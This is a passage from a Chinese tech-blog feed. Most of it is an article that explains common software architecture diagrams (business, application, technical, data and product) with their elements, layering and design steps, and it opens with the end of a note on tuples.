<p>从方法返回多个值。</p>
</li>
<li>
<p>用于模式匹配或解构场景。</p>
</li>
</ul>
<h4 data-id="heading-24">何时避免元组：</h4>
<ul>
<li>
<p>数据结构复杂或需要长期维护时，使用类或结构体。</p>
</li>
<li>
<p>需要序列化或跨层传递数据时。</p>
</li>
<li>
<p>元组元素过多（通常建议不超过 4-5 个元素）。</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一次性讲清楚常见的软件架构图]]></title>    <link>https://juejin.cn/post/7576129509935120403</link>    <guid>https://juejin.cn/post/7576129509935120403</guid>    <pubDate>2025-11-24T15:59:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576129509935120403" data-draft-id="7576098886860947499" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 一次性讲清楚常见的软件架构图"/> <meta itemprop="keywords" content="后端,架构"/> <meta itemprop="datePublished" content="2025-11-24T15:59:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="uzong"/> <meta itemprop="url" content="https://juejin.cn/user/372082495985181"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             一次性讲清楚常见的软件架构图
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/372082495985181/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    uzong
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T15:59:57.000Z" title="Mon Nov 24 2025 15:59:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读23分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文是根据 ProcessOn 整理汇总而来，ProcessOn 是一个非常不错的画图软件，功能强大，界面优美。</p>
<p>作者：面汤放盐（微信公众号）</p>
<p>时间：2025.11.24</p>
<h2 data-id="heading-0"><strong>架构图详细分类</strong></h2>
<p>架构图作为一种重要的工具，用于可视化展示软件、系统、应用程序等的体系结构及其组成部分之间的关系。</p>
<p>常用的架构图种类有：<strong>业务架构图、应用架构图、系统架构图、技术架构图、部署架构图、数据架构图、产品架构图、功能架构图、信息架构图等</strong>。</p>
<p><strong>关于架构图所处位置，可见下图所示：</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6569e86afd7847858080b208529fac2e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=8JdN8yxFcpg%2BOFMMQw2lqY6cTrw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">1. 业务架构图</h2>
<h3 data-id="heading-2">1.1. 什么是业务架构图</h3>
<p>业务架构服务于业务目标，通过描绘业务上下层关系，<strong>梳理一整套完整、简单的业务视图，降低业务系统的复杂度，提高客户理解度，最终给客户最直观的业务体现。</strong></p>
<p>画业务架构图需要对业务熟悉掌握，<strong>并对业务进行收集、拆解、提炼、归纳、分类，从而绘制出业务的上下层级关系和主要结构模块。为后续围绕业务内容展开的工作提供可视化支持</strong>。</p>
<p>比如做一个团购网站，你只需要把商品类目、货品库存、订单服务、支付退款等进行清晰划分，而不需要考虑以下问题：我用什么技术开发、我的并发大怎么办、我选择什么样的硬件等。</p>
<h3 data-id="heading-3">1.2. 业务架构图构成要素</h3>
<p><strong>业务能力</strong>：企业“能做什么”--抽象层级高的功能，如“客户管理”、“订单处理”</p>
<p><strong>业务流程</strong>：描述业务活动“如何做”--如“下单流程”、“客户服务流程”</p>
<p><strong>业务角色</strong>：组织中承担特定职责的角色，如“客服人员”、“销售代表”</p>
<p><strong>组织结构</strong>：企业组织架构中的部门、分支等</p>
<p><strong>信息对象</strong>：业务中使用和产生的数据，如“订单”、“客户档案”</p>
<p><strong>服务</strong>：可被调用的业务功能，如“开票服务”、“查询账户”</p>
<h3 data-id="heading-4">1.3. 业务架构核心价值</h3>
<p><strong>战略目标</strong>：明确公司的长期愿景和短期目标。</p>
<p><strong>价值流</strong>：识别和优化业务流程，确保价值最大化。</p>
<p><strong>业务能力</strong>：确定组织的核心竞争力和服务能</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0482b2cac2a14fd4a57d6e90656485b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=wp2z6Zbk4RhvvwHrbB6cEo5k2C8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">1.4. 业务架构分层</h3>
<p><strong>上中下结构</strong>：资源层—数据层—平台层—业务层—用户层。</p>
<p><strong>左中右结构</strong>：上游产业—业务模型—下游产业。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4dfd6b8e58224158b37e32470ed166f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=z2N%2BLAfknCVw4i5nhJ%2BvKeMN3Sw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">1.5. 业务架构图设计规范</h3>
<p><strong>横向</strong>：并列结构，左边的和右边的，级别要相同</p>
<p><strong>纵向</strong>：要分层，上层依赖下层，底层更重要。</p>
<p><strong>对称</strong>：讲究对称美，功能结构分配均匀。</p>
<p><strong>虚线框</strong>：逻辑上可归为一块的多个模块可用虚线框。</p>
<p><strong>色彩</strong>：颜色搭配要有区分，每个大的业务功能之间要有颜色做区分，但整体风格要一致。</p>
<p><strong>大小格式</strong>：大小要一致，统一格式。</p>
<p><strong>模块分级</strong>：同一级别模块要统一级别，粒度大小也要统一。</p>
<p><strong>词汇描述</strong>：用词要准确，让开发人员或用户能理解。</p>
<p><strong>模块划分粒度</strong>：细节要抽象出模块，粒度要合适，不能太具体或太宽泛。</p>
<h3 data-id="heading-7">1.6. 业务架构图使用场景</h3>
<p><strong>产品汇报</strong>：在产品规划和汇报会议上，可以用业务架构图来展现业务全局状态。</p>
<p><strong>技术汇报</strong>：在汇报的时候不能只讲技术，也要讲业务的发展情况，用业务架构图就能够比较容易地展现业务整体情况。</p>
<p><strong>员工培训</strong>：给新员工培训业务的时候，发一张业务架构图给他，能让新员工对整体业务有一个全局的认识和了解。</p>
<h2 data-id="heading-8">2. 应用架构图</h2>
<h3 data-id="heading-9">2.1. 什么是应用架构图</h3>
<p>应用架构图也叫逻辑架构图，是一种视觉化的工具，<strong>用于描述应用程序的结构和各个组件之间的交互方式</strong>。应用架构的设计起源于5W1H业务调研表中的信息化需求，结合业务组件的五要素定义等，以及现有信息系统的建设情况梳理IT应用现状，通过分析得出现状应用架构。</p>
<p>应<strong>用架构图包括应用程序的层次结构、组件、数据流和交互，帮助理解和设计复杂应用程序，一般分为：表现层、数据层、应用逻辑层和基础通用层</strong>。</p>
<p><strong>应用架构图在所有架构图中起到了呈上启下的作用，向上承接了业务模式和产品功能的实现落地，向下指导了技术模块的设计与展开。应用架构图也是整个系统实现的总体架构，需要指出系统的层次、系统开发的原则、系统各个层次的应用服务</strong></p>
<hr/>
<h3 data-id="heading-10">2.2. 应用架构图组成元素</h3>
<p><strong>应用系统</strong>：企业内部或外部使用的软件系统，用矩形框表示</p>
<p><strong>模块/子系统</strong>：应用内部的功能模块，用嵌套框、分组区域表示</p>
<p><strong>系统之间的接口</strong>：系统之间的数据流、服务调用等，用箭头表示</p>
<p><strong>业务对象/数据流</strong>：通过系统流转的业务数据，用标签、泳道、颜色区分</p>
<p><strong>用户或业务角色</strong>：使用系统的用户或组织，用人形图标表示</p>
<p><strong>接口技术</strong>：如 REST、SOAP</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5b3239a1ef44647bab287afbb5cf9b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=%2Bl%2F3FheibA3J7ORUa6OPKZN4OWA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-11">2.3. 应用架构分层方式</h3>
<p><strong>横向水平分层</strong>，按照功能处理顺序划分应用，比如把系统分为web前端/中间服务/后台任务，这是面向业务深度的划分。</p>
<p><strong>纵向垂直分层</strong>，按照不同的业务类型划分应用，比如进销存系统可以划分为三个独立的应用，这是面向业务广度的划分</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b16b82f515be415a90498a079829c30a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=V6gqoFH25%2FSkQa5L%2BztSwmbquFs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-12">2.4. 应用架构图层级结构</h3>
<p><strong>三层架构</strong>：表现层、业务逻辑层和数据访问层。</p>
<p><strong>四层架构</strong>：表现层、应用层、业务逻辑层和数据访问层。</p>
<p><strong>其他分层结构</strong>：可以根据应用程序的实际需求进行分层，例如微服务架构、基于事件的架构等。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f673738189b4423493a92e9ce3793ca0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=g%2FXumwqGm01DZ7Xu6CRKPrnNS58%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-13">3. 技术架构图</h2>
<h3 data-id="heading-14">3.1. 什么是技术架构图</h3>
<p>技术架构图是基于产品开发之下的技术执行分支，描述了需要支持业务、数据和应用服务的软件和硬件能力，包括IT基础设施、中间件、网络、通信、流程、标准等。技术架构图绘制有助于团队对技术结构、实现方案、技术组件等进行宏观了解，对后续的具体技术工作提供基础认识。</p>
<p>技术架构解决的问题包括：<strong>纯技术层面的分层、开发框架的选择、开发语言的选择、涉及非功能性需求的技术选型，主要目标是基于现状技术架构、技术标准、业务/应用/数据架构要求，设计目标技术架构</strong>。<br/>
技术架构主要考虑系统的非功能性特征，对系统的可用性、高性能、扩展、安全、伸缩性、简洁等做系统级的把握，要求架构师具备软件和硬件的功能和性能的过硬知识，这也是技术架构设计工作中最为困难的工作。</p>
<h3 data-id="heading-15">3.2. 技术架构图组成要素</h3>
<p><strong>模块与组件</strong>：展示系统的核心功能模块，如用户服务、订单处理、支付网关等。</p>
<p><strong>数据流与交互逻辑</strong>：描绘信息流动轨迹，包括数据的输入、输出和转换过程。</p>
<p><strong>通信协议与依赖关系</strong>：描述各个系统组件之间如何进行交互，使用的通信协议如HTTP、TCP/IP、消息队列等。</p>
<p><strong>基础设施与部署环境</strong>：描述系统运行的硬件或云环境，如服务器、虚拟机、网络资源等。</p>
<p><strong>安全与权限体系</strong>：描述如何管理用户权限、数据加密以及其他安全策略</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1173495b398c4e94bc0ec287925556e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=sKGFWcS%2FlUTmpEQrCZEzwcZjId8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-16">3.3. 技术架构图应用场景</h3>
<p>技术架构图应用广泛，常用在：项目立项或方案评审、架构设计或重构汇报、安全合规与系统审计、跨部门技术协作说明、技术文档附图说明等场景。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69de7f4ca3d443f79ec6654b86e02659~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=Fd3tglM9C9WCxT%2FAkBEKKgAaqqI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-17">3.4. 技术架构图与系统架构图区别</h3>
<p>系统架构图是关于“做什么”和“怎么做”的高层次描述，而技术架构图是关于“怎么做”的更详细的技术实现描述。两者相辅相成，共同指导软件系统的设计和开发。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec9a184813de44db9be0125de427e63b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=OnwOO0J4lwXFd7xnoeA2U8NU%2Byk%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-18">3.5. 技术架构图主要作用</h3>
<p><strong>明确系统结构和组件关系</strong>：展现系统整体架构，以及各个组件之间的依赖和交互方式。</p>
<p><strong>指导开发和维护</strong>：帮助开发人员理解系统设计，方便进行开发、测试、部署和维护工作。</p>
<p><strong>促进团队协作和沟通</strong>：提供清晰的视觉化表示，方便团队成员之间进行交流和理解，减少沟通成本。</p>
<p><strong>支持技术选型和方案设计</strong>：帮助选择合适的技术栈，规划系统架构，保证系统的可扩展性和可维护性</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/294f53aac28d48dabe23351d75a33629~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=gOFMxiIbryP2riPOWNry7l47ceQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-19">3.6. 技术架构图设计步骤</h3>
<p>1，根据应用架构，进行技术支撑分析，识别技术支撑的必要条件<br/>
2，技术选型，包括开发架构、技术产品、开发技术栈、开发平台、运行平台<br/>
3，技术影响分析，成本，难易度，规划，治理</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c22f1bbea5d4d2fb53938afb2ce1bd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=do03CeFe50ZKzfaJ9Kf4rvxDQQw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-20">4. 数据架构图</h2>
<p>数据架构图: 是连接<strong>业务与系统的纽带</strong>，关注系统中<strong>数据的存储方案</strong>，包括<strong>数据模型、数据存储格式、数据传递、数据复制、数据同步等策略</strong>。根据数据架构可以了解主体架构的数据模型、数据分布和数据资产之间的结构与关系，为数据库管理员和开发人员提供数据管理和数据处理的指导，帮助他们理解系统的数据结构和数据流动方式。</p>
<h3 data-id="heading-21">4.1. 什么是数据架构图</h3>
<p>数据架构图是从数据侧描述数据怎么来、怎么存、怎么加工、怎么使用，重点关注系统中数据的存储方案，包括数据模型、数据存储格式、数据传递、数据复制、数据同步等策略。它会根据各个系统应用场景、不同时间段的应用场景 ，对数据进行诸如数据异构、读写分离、缓存使用、分布式数据策略等划分。</p>
<p>数据架构图为数据库管理员和开发人员提供数据管理和数据处理的指导，帮助他们理解系统的数据结构和数据流动方式，从而优化数据管理流程，提高系统效率，并支持数据驱动的决策过程。<br/>
绘制数据架构图需要注意的核心内容有4点：</p>
<p>1）从数据源开始，数据通过哪些方式集成大到数仓；</p>
<p>2）数据集成到数仓之后，存储在哪里，数仓怎么分层，每一层的任务是什么；</p>
<p>3）数据在数据集市中又怎么存储、怎么管理；</p>
<p>4）数据到数据应用层又提供给哪些应用。</p>
<h3 data-id="heading-22">4.2. 数据架构图构成元素</h3>
<p><strong>数据源</strong>：这是数据进入系统的起点，可以是各种内部系统（如ERP、CRM）或外部系统（如第三方API、社交媒体）。</p>
<p><strong>数据存储</strong>：存储系统负责持久化数据，包括数据库（如关系型数据库、NoSQL数据库）、数据仓库、数据湖等。</p>
<p><strong>数据处理</strong>：处理模块负责对原始数据进行清洗、转换、聚合等操作，以便后续的分析和使用。</p>
<p><strong>数据分析</strong>：分析模块提供各种分析工具和方法，以从数据中提取有价值的信息。</p>
<p><strong>数据服务</strong>：将处理和分析后的数据以API或其他形式对外提供服务，供其他系统或用户使用。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/833783446ff94187a0b4e4d65929e9be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=LLgq9gkkiprFHAQ1T3inUmRxPJ0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-23">4.3. 数据架构图六大模块</h3>
<p><strong>数据声明</strong>：架构工作声明是架构开发方法中的关键文档之一，描述架构开发的范围、方法、资源和计划，它定义了架构项目的基本框架和预期成果，数据声明是其中的一部分。</p>
<p><strong>数据原则</strong>：用于指导企业架构设计和实施的一组基本准则和指导方针，确保架构的一致性、灵活性和可扩展性，使架构决策在不同的项目和团队中保持一致。</p>
<p><strong>数据模型</strong>：定义数据元素、它们的属性以及数据元素之间的关系。输出物包括概念模型、逻辑模型、物理模型、数据目录等。</p>
<p><strong>数据流动</strong>：数据流动的主要输出物包括数据流转、数业映射等，描述数据在系统内和系统间的流动和传输方式。</p>
<p><strong>数据管理</strong>：数据管理是指对企业内所有数据资产的管理和控制，旨在确保数据的高质量、完整性、安全性、可用性和可访问性，以支持业务决策和运营。</p>
<p><strong>数据治理</strong>：数据治理涉及制定数据策略、建立数据管理组织结构和流程，以确保数据的一致性、完整性和使用合规性</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17ddaf71a49b488ca5910c148f763c2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=yKTjMZgh%2F0lhoBsveL%2F4g9vhl%2Bs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-24">4.4. 数据架构图作用</h3>
<p>数据架构主要解决三个问题：</p>
<p>第一，系统需要什么样的数据；</p>
<p>第二，如何存储这些数据；</p>
<p>第三，如何进行数据架构设计</p>
<h3 data-id="heading-25">4.5. 数据架构图核心目标</h3>
<p><strong>明确数据流向</strong>，描述数据从源头采集、处理、分发到消费的过程</p>
<p><strong>梳理数据结构</strong>，展示关键数据域、表结构、数据模型</p>
<p><strong>统一数据标准</strong>，辅助数据分类分级、命名规范、元数据治理</p>
<p><strong>支持平台建设</strong>，为构建数据中台、数据湖、数据仓库提供依据</p>
<p><strong>支撑合规治理</strong>，满足数据安全、合规、主数据管理等需求</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/291c5c2cb477422a81213df78f92fcdb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=Vf1bgL8M68159%2B18JKLlhy89wv8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-26">4.6. 数据架构图设计步骤</h3>
<p><strong>上接业务架构，</strong> 分析数据需求，识别数据类型，采集数据</p>
<p><strong>数据模型设计，</strong> 概念模型、逻辑模型、物理模型</p>
<p><strong>数据治理</strong>，数据安全合规，数据质量管理</p>
<p><strong>数据共享开放</strong>，支撑业务决策，业务创新</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/04c6f789051546678a13f4009bca4493~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=9OI00WVH9rSbj%2Bl2WqBB4ub2r68%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-27">5. 产品架构图</h2>
<h3 data-id="heading-28">5.1. 什么是产品架构图</h3>
<p><strong>产品架构图是产品经理用来表达自己产品设计机制的图，它将产品功能落地为信息化、模块化、层次清晰的可视化架构，并通过不同分层的交互关系、功能模块的组合、数据和信息的流转，来传递产品的业务流程、商业模式和设计思路，它是设计复杂产品时不可或缺的文档之一</strong>。</p>
<p>产品架构图是构建系统化技术蓝图的基础，其重要性在于通过分层展示功能模块、技术组件和数据流向等核心要素，直观呈现产品各层级的逻辑关系与技术实现路径。</p>
<p>一张逻辑清晰、层次明确的产品架构图，是对一个产品功能架构体系的高度抽象，能够给观者讲述一个产品的业务流程、功能框架和设计思路，项目组成员如果能将产品架构图熟记心中，那么对产品的演进方向就会有一个整体的概念，不至于在平时的设计和建设过程中“盲人摸象”</p>
<h3 data-id="heading-29">5.2. 产品架构图构成</h3>
<p><strong>模块划分</strong>：将产品分解为不同的功能模块，例如用户界面、业务逻辑、数据存储、支付系统等。</p>
<p><strong>交互关系</strong>：明确各个模块之间的交互方式，例如用户如何通过界面与后端系统进行交互，不同模块之间如何传递数据。</p>
<p><strong>信息流动</strong>：展示信息在不同模块之间的流转路径，确保每个模块的功能和数据来源都能得到清晰表达。</p>
<p><strong>技术实现</strong>：包含技术层面的内容，例如使用的技术栈、数据库类型、服务器架构等。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/680c29e85bb844efa9b18929b1820a84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=CEN9wp1DuIvt%2BN2%2Bb1rpZdj6iqA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-30">5.3. 产品架构图分层</h3>
<p><strong>统一的用户感知层</strong>：解决的是用户触达的问题，考虑在何种场景下通过何种方式触达用户。</p>
<p><strong>解耦的业务功能层</strong>：本质是解决产品的核心功能的设计问题，包括如何高效的完成业务功能，如何与用户层进行交互，如何与外部系统进行数据通信等一系列复杂的业务处理。</p>
<p><strong>集中的数据处理层</strong>：产品的数据从哪里来，沉淀到哪里去，数据如何高效的存储，如何快速的被调用。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e400608cd6c44e8a8ac38c992c57939~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=v5IewJo7Lid59d%2B2fMO98LfSAdc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-31">5.4. 产品架构图重要性</h3>
<p>在产品正式进入开发以前，绘制一个完整的产品架构图已成为必然。产品架构图的根本目的就是为了梳理产品思路，从整体上把握产品的发展方向，把控产品的功能重点，它决定了产品必须要实现的功能，以及什么时候必须完成的功能。</p>
<p>同时，为了满足所设定的产品架构图，还必须配备相关的产品研发和市场运营资源以及具体的落地计划，包括技术选型和技术路径、市场营销规划等一系列的策略和措施。</p>
